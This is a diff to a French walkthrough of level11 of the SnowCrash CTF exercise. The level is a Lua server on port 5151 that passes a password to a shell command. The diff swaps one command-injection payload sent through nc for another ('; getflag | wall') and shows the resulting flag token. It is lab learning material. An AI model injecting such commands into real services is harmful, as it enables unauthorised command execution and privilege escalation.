@@ -6,7 +6,7 @@ total 4
 -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
 ```
 
-En l'examinant, on trouve que c'est un serveur qui va accepter des requêtes de connexion sur le port 5151, et qui demandera un mot de passe pour se connecter.
+En l'examinant, on trouve que c'est un serveur qui va accepter des requêtes de connexion sur le port **5151**, et qui demandera un mot de passe pour se connecter.
 
 ```bash
 level11@SnowCrash:~$ cat level11.lua 
@@ -52,7 +52,7 @@ Pour cela, on va sur le site [dcode](https://www.dcode.fr/hash-sha1)
 
 On obtient le résultat : `NotSoEasy`.
 
-Évidemment, ce mot de passe n'est pas le bon, car il ne permet pas de se connecter à **flag11** ou **level12**.
+Évidemment, ce mot de passe n'est pas le bon, car il permet de se connecter ni à **flag11** ni à **level12**.
 
 ```bash
 level11@SnowCrash:~$ su flag11
@@ -70,9 +70,13 @@ En regardant plus en détail le code, la commande qu'utilise le script est une c
 On peut donc exploiter cette partie en utilisant la commande `getflag`.
 
 ```bash
-level11@SnowCrash:~$ echo "; getflag > /tmp/o" | nc 127.0.0.1 5151
-Password: Erf nope..
-level11@SnowCrash:~$ cat /tmp/o
+level11@SnowCrash:~$ echo "; getflag | wall" | nc 127.0.0.1 5151
+
+Broadcast Message from flag11@Snow
+        (somewhere) at XX:XX ...
+
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+Erf nope..
 ```
 
